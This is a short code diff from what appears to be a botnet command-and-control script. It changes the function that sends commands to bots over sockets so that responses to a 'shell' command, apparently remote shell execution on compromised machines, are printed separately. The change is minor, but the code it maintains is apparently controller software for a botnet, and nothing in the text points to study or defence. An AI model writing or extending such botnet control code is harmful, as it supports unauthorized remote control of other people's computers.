@@ -198,7 +198,10 @@ def send_command(bot, command):
     bot_socket.send(command.encode())
     response = bot_socket.recv(4096).decode()
     bot_socket.close()
-    print(f"Bot {bot_id} responded with {response}")
+    if command == 'shell':
+        print("Shell output: ", response)
+    else:
+        print(f"Bot {bot_id} responded with {response}")
 
 def main():
     if not os.path.exists(DATABASE):
